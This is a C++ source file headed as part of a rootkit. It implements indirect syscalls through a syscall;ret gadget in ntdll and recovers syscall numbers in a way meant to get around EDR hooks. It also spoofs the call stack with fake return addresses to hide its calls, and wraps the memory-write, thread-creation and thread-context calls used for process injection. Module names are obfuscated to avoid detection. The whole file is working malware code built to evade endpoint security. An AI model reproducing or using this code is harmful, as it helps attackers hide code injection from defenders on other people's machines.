// XvX Rootkit - Indirect syscalls + stack spoof (KhaosC2 / SilentMoonwalk)

#include "IndirectSyscalls.h"
#include "StringObfuscation.h"
#include <string.h>

SYSCALL_STATE IndirectSyscalls::g_State = {NULL, NULL, NULL, NULL, FALSE};
SYSCALL_TABLE IndirectSyscalls::g_SSNs  = {0};

// ============================================================
// Find `syscall; ret` (0F 05 C3) in LOADED ntdll — image-backed ✓
// ============================================================

PVOID IndirectSyscalls::FindSyscallGadgetInMemory(HMODULE hNtdll) {
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hNtdll;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return NULL;

    PIMAGE_NT_HEADERS64 nt = (PIMAGE_NT_HEADERS64)((BYTE*)hNtdll + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return NULL;

    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
    BYTE* textBase = NULL;
    DWORD textSize = 0;

    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (memcmp(sec[i].Name, ".text", 5) == 0) {
            textBase = (BYTE*)hNtdll + sec[i].VirtualAddress;
            textSize = sec[i].Misc.VirtualSize;
            break;
        }
    }
    if (!textBase) return NULL;

    BYTE* p   = textBase;
    BYTE* end = p + textSize - 2;
    static volatile BYTE _b0 = 0x0F, _b1 = 0x05, _b2 = 0xC3;
    while (p < end) {
        if (p[0] == _b0 && p[1] == _b1 && p[2] == _b2) return p;
        p++;
    }
    return NULL;
}

// ============================================================
// .text section helper — returns base + size for a mapped module
// ============================================================

static bool GetTextSection(HMODULE hMod, BYTE** base, DWORD* size) {
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hMod;
    PIMAGE_NT_HEADERS64 nt = (PIMAGE_NT_HEADERS64)((BYTE*)hMod + dos->e_lfanew);
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (memcmp(sec[i].Name, ".text", 5) == 0) {
            *base = (BYTE*)hMod + sec[i].VirtualAddress;
            *size = sec[i].Misc.VirtualSize;
            return true;
        }
    }
    return false;
}

// ============================================================
// FindDesyncCallSite — ntdll address where:
//   [addr-5] == 0xE8  (preceded by CALL → EDR sees legit return site)
//   [addr+0..4] == 48 83 C4 10 C3  (add rsp,0x10 ; ret → redirects execution to cleanup)
// ============================================================

PVOID IndirectSyscalls::FindDesyncCallSite(HMODULE hMod) {
    BYTE* text; DWORD textSize;
    if (!GetTextSection(hMod, &text, &textSize) || textSize < 10) return NULL;

    // start at +5 so addr-5 is still within .text
    BYTE* p   = text + 5;
    BYTE* end = text + textSize - 5;
    static volatile BYTE _e8=0xE8, _48=0x48, _83=0x83, _c4=0xC4, _10=0x10, _c3=0xC3;
    while (p < end) {
        if (p[-5] == _e8 &&
            p[0] == _48 && p[1] == _83 && p[2] == _c4 && p[3] == _10 && p[4] == _c3)
            return p;
        p++;
    }
    return NULL;
}

// ============================================================
// FindCallSite — address right after 0xE8 (CALL rel32) in hMod .text
// startOffset: byte offset into .text to begin scan (get distinct hits)
// ============================================================

PVOID IndirectSyscalls::FindCallSite(HMODULE hMod, SIZE_T startOffset) {
    BYTE* text; DWORD textSize;
    if (!GetTextSection(hMod, &text, &textSize)) return NULL;
    if (startOffset + 5 >= textSize) return NULL;

    BYTE* p   = text + startOffset;
    BYTE* end = text + textSize - 5;
    while (p < end) {
        if (*p == 0xE8) return p + 5;  // return site right after CALL rel32
        p++;
    }
    return NULL;
}

// ============================================================
// Tartarus Gate — SSN extraction from LOADED (image-backed) ntdll
//
// Scans Nt* exports, sorts by VA, reads SSN from unhooked stubs
// (4C 8B D1 B8 xx xx xx xx). If target stub is hooked (patched
// to jmp/int3/etc.), interpolates from the nearest unhooked neighbor
// using the fact that VA order = SSN order for Nt* stubs in ntdll.
//
// No disk I/O. No private anonymous mapping. Zero EDR surface.
// ============================================================

DWORD IndirectSyscalls::TartarusSSN(HMODULE hNtdll, const char* target) {
    PIMAGE_DOS_HEADER    dos = (PIMAGE_DOS_HEADER)hNtdll;
    PIMAGE_NT_HEADERS64  nt  = (PIMAGE_NT_HEADERS64)((BYTE*)hNtdll + dos->e_lfanew);
    DWORD expRva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (!expRva) return 0;

    PIMAGE_EXPORT_DIRECTORY exp = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hNtdll + expRva);
    DWORD* funcs    = (DWORD*)((BYTE*)hNtdll + exp->AddressOfFunctions);
    DWORD* names    = (DWORD*)((BYTE*)hNtdll + exp->AddressOfNames);
    WORD*  ordinals = (WORD*) ((BYTE*)hNtdll + exp->AddressOfNameOrdinals);

    struct Entry { PVOID va; DWORD ssn; BOOL hooked; };
    Entry entries[512];
    DWORD count   = 0;
    PVOID targetVA = NULL;

    for (DWORD i = 0; i < exp->NumberOfNames && count < 512; i++) {
        const char* name = (const char*)((BYTE*)hNtdll + names[i]);
        if (name[0] != 'N' || name[1] != 't') continue;     // Nt* only (skip Zw* duplicates)
        BYTE* va = (BYTE*)hNtdll + funcs[ordinals[i]];
        static volatile BYTE _4c=0x4C, _8b=0x8B, _d1=0xD1, _b8=0xB8;
        BOOL hooked = !(va[0]==_4c && va[1]==_8b && va[2]==_d1 && va[3]==_b8);
        entries[count].va     = va;
        entries[count].ssn    = hooked ? 0 : *(DWORD*)(va + 4);
        entries[count].hooked = hooked;
        if (strcmp(name, target) == 0) targetVA = va;
        count++;
    }

    if (!targetVA || count == 0) return 0;

    // Insertion sort by VA — count ≤ ~400, O(n²) is fine
    for (DWORD i = 1; i < count; i++) {
        Entry tmp = entries[i]; int j = (int)i - 1;
        while (j >= 0 && (BYTE*)entries[j].va > (BYTE*)tmp.va) {
            entries[j + 1] = entries[j]; j--;
        }
        entries[j + 1] = tmp;
    }

    // Locate target in sorted list
    int ti = -1;
    for (DWORD i = 0; i < count; i++) {
        if (entries[i].va == targetVA) { ti = (int)i; break; }
    }
    if (ti < 0) return 0;
    if (!entries[ti].hooked) return entries[ti].ssn;

    // Hooked: walk outward to nearest unhooked neighbor, interpolate SSN
    // VA order == SSN order, so neighbor at offset ±r has SSN ±r from target
    for (DWORD r = 1; r < count; r++) {
        int lo = ti - (int)r;
        int hi = ti + (int)r;
        if (lo >= 0        && !entries[lo].hooked) return entries[lo].ssn + r;
        if (hi < (int)count && !entries[hi].hooked && entries[hi].ssn >= r)
            return entries[hi].ssn - r;
    }
    return 0; // all Nt* stubs hooked — extremely unlikely
}

// ============================================================
// Initialize
// ============================================================

BOOL IndirectSyscalls::Initialize() {
    if (g_State.Initialized) return TRUE;

    // All work on LOADED ntdll — image-backed, no disk I/O, no private mappings
    HMODULE hNtdll = GetModuleHandleA(OBFUSCATE("ntdll.dll"));
    if (!hNtdll) return FALSE;

    // Step 1: extract SSNs via Tartarus Gate (handles hooked stubs)
    #define TSSN(name) TartarusSSN(hNtdll, OBFUSCATE(#name))
    g_SSNs.NtAllocateVirtualMemory  = TSSN(NtAllocateVirtualMemory);
    g_SSNs.NtWriteVirtualMemory     = TSSN(NtWriteVirtualMemory);
    g_SSNs.NtProtectVirtualMemory   = TSSN(NtProtectVirtualMemory);
    g_SSNs.NtCreateThreadEx         = TSSN(NtCreateThreadEx);
    g_SSNs.NtOpenProcess            = TSSN(NtOpenProcess);
    g_SSNs.NtQuerySystemInformation = TSSN(NtQuerySystemInformation);
    g_SSNs.NtReadVirtualMemory      = TSSN(NtReadVirtualMemory);
    g_SSNs.NtClose                  = TSSN(NtClose);
    g_SSNs.NtGetContextThread       = TSSN(NtGetContextThread);
    g_SSNs.NtSetContextThread       = TSSN(NtSetContextThread);
    g_SSNs.NtSuspendThread          = TSSN(NtSuspendThread);
    g_SSNs.NtResumeThread           = TSSN(NtResumeThread);
    #undef TSSN

    // Step 2: syscall;ret gadget in loaded ntdll — image-backed, ETW Ti safe
    g_State.SyscallGadget = FindSyscallGadgetInMemory(hNtdll);
    if (!g_State.SyscallGadget) return FALSE;

    // Step 3: DesyncCallSite (FakeRet1) — ntdll, preceded by CALL, = add rsp,0x10;ret
    g_State.FakeRet1 = FindDesyncCallSite(hNtdll);
    if (!g_State.FakeRet1) return FALSE;

    // Step 4: NtCallSite (FakeRet2) — distinct CALL return site in ntdll (never reached)
    SIZE_T desyncOff = (BYTE*)g_State.FakeRet1 - (BYTE*)hNtdll;
    g_State.FakeRet2 = FindCallSite(hNtdll, desyncOff + 0x10);
    if (!g_State.FakeRet2) g_State.FakeRet2 = FindCallSite(hNtdll, 0);

    // Step 5: KbCallSite (FakeRet3) — CALL return site in kernelbase (never reached)
    HMODULE hKb = GetModuleHandleA(OBFUSCATE("kernelbase.dll"));
    if (!hKb) hKb = GetModuleHandleA(OBFUSCATE("kernel32.dll"));
    g_State.FakeRet3 = hKb ? FindCallSite(hKb, 0x1000)
                            : FindCallSite(hNtdll, desyncOff + 0x200);

    g_State.Initialized = TRUE;
    return TRUE;
}

void IndirectSyscalls::Cleanup() {
    g_State = {NULL, NULL, NULL, NULL, FALSE};
}

// ============================================================
// Syscall wrappers — all use DoSyscallSpoof (image-backed + stack spoof)
// ============================================================

NTSTATUS IndirectSyscalls::SysNtAllocateVirtualMemory(
    HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits,
    PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect)
{
    if (!g_State.Initialized) return (NTSTATUS)-1;
    return Syscall6(g_SSNs.NtAllocateVirtualMemory,
        (PVOID)ProcessHandle, (PVOID)BaseAddress, (PVOID)ZeroBits,
        (PVOID)RegionSize,
        (PVOID)(ULONG_PTR)AllocationType,
        (PVOID)(ULONG_PTR)Protect);
}

NTSTATUS IndirectSyscalls::SysNtWriteVirtualMemory(
    HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer,
    SIZE_T NumberOfBytesToWrite, PSIZE_T NumberOfBytesWritten)
{
    if (!g_State.Initialized) return (NTSTATUS)-1;
    return Syscall6(g_SSNs.NtWriteVirtualMemory,
        (PVOID)ProcessHandle, BaseAddress, Buffer,
        (PVOID)NumberOfBytesToWrite, (PVOID)NumberOfBytesWritten, NULL);
}

NTSTATUS IndirectSyscalls::SysNtProtectVirtualMemory(
    HANDLE ProcessHandle, PVOID* BaseAddress, PSIZE_T NumberOfBytesToProtect,
    ULONG NewAccessProtection, PULONG OldAccessProtection)
{
    if (!g_State.Initialized) return (NTSTATUS)-1;
    return Syscall6(g_SSNs.NtProtectVirtualMemory,
        (PVOID)ProcessHandle, (PVOID)BaseAddress,
        (PVOID)NumberOfBytesToProtect,
        (PVOID)(ULONG_PTR)NewAccessProtection,
        (PVOID)OldAccessProtection, NULL);
}

NTSTATUS IndirectSyscalls::SysNtCreateThreadEx(
    PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, PVOID ObjectAttributes,
    HANDLE ProcessHandle, PVOID StartRoutine, PVOID Argument,
    ULONG CreateFlags, SIZE_T ZeroBits, SIZE_T StackSize,
    SIZE_T MaximumStackSize, PVOID AttributeList)
{
    if (!g_State.Initialized) return (NTSTATUS)-1;
    return DoSyscallSpoof11(
        g_SSNs.NtCreateThreadEx,
        g_State.SyscallGadget, g_State.FakeRet1, g_State.FakeRet2, g_State.FakeRet3,
        (PVOID)ThreadHandle,
        (PVOID)(ULONG_PTR)DesiredAccess,
        ObjectAttributes,
        (PVOID)ProcessHandle,
        StartRoutine,
        Argument,
        (PVOID)(ULONG_PTR)CreateFlags,
        (PVOID)ZeroBits,
        (PVOID)StackSize,
        (PVOID)MaximumStackSize,
        AttributeList);
}

NTSTATUS IndirectSyscalls::SysNtOpenProcess(
    PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess,
    PVOID ObjectAttributes, PVOID ClientId)
{
    if (!g_State.Initialized) return (NTSTATUS)-1;
    return Syscall6(g_SSNs.NtOpenProcess,
        (PVOID)ProcessHandle, (PVOID)(ULONG_PTR)DesiredAccess,
        ObjectAttributes, ClientId, NULL, NULL);
}

NTSTATUS IndirectSyscalls::SysNtReadVirtualMemory(
    HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer,
    SIZE_T NumberOfBytesToRead, PSIZE_T NumberOfBytesRead)
{
    if (!g_State.Initialized) return (NTSTATUS)-1;
    return Syscall6(g_SSNs.NtReadVirtualMemory,
        (PVOID)ProcessHandle, BaseAddress, Buffer,
        (PVOID)NumberOfBytesToRead, (PVOID)NumberOfBytesRead, NULL);
}

NTSTATUS IndirectSyscalls::SysNtQuerySystemInformation(
    ULONG SystemInformationClass, PVOID SystemInformation,
    ULONG SystemInformationLength, PULONG ReturnLength)
{
    if (!g_State.Initialized) return (NTSTATUS)-1;
    return Syscall6(g_SSNs.NtQuerySystemInformation,
        (PVOID)(ULONG_PTR)SystemInformationClass,
        SystemInformation,
        (PVOID)(ULONG_PTR)SystemInformationLength,
        (PVOID)ReturnLength, NULL, NULL);
}

NTSTATUS IndirectSyscalls::SysNtClose(HANDLE Handle) {
    if (!g_State.Initialized) return (NTSTATUS)-1;
    return Syscall6(g_SSNs.NtClose,
        (PVOID)Handle, NULL, NULL, NULL, NULL, NULL);
}

NTSTATUS IndirectSyscalls::SysNtGetContextThread(HANDLE ThreadHandle, PCONTEXT ThreadContext) {
    if (!g_State.Initialized) return (NTSTATUS)-1;
    return Syscall6(g_SSNs.NtGetContextThread,
        (PVOID)ThreadHandle, (PVOID)ThreadContext, NULL, NULL, NULL, NULL);
}

NTSTATUS IndirectSyscalls::SysNtSetContextThread(HANDLE ThreadHandle, PCONTEXT ThreadContext) {
    if (!g_State.Initialized) return (NTSTATUS)-1;
    return Syscall6(g_SSNs.NtSetContextThread,
        (PVOID)ThreadHandle, (PVOID)ThreadContext, NULL, NULL, NULL, NULL);
}

NTSTATUS IndirectSyscalls::SysNtSuspendThread(HANDLE ThreadHandle, PULONG PreviousSuspendCount) {
    if (!g_State.Initialized) return (NTSTATUS)-1;
    return Syscall6(g_SSNs.NtSuspendThread,
        (PVOID)ThreadHandle, (PVOID)PreviousSuspendCount, NULL, NULL, NULL, NULL);
}

NTSTATUS IndirectSyscalls::SysNtResumeThread(HANDLE ThreadHandle, PULONG PreviousSuspendCount) {
    if (!g_State.Initialized) return (NTSTATUS)-1;
    return Syscall6(g_SSNs.NtResumeThread,
        (PVOID)ThreadHandle, (PVOID)PreviousSuspendCount, NULL, NULL, NULL, NULL);
}
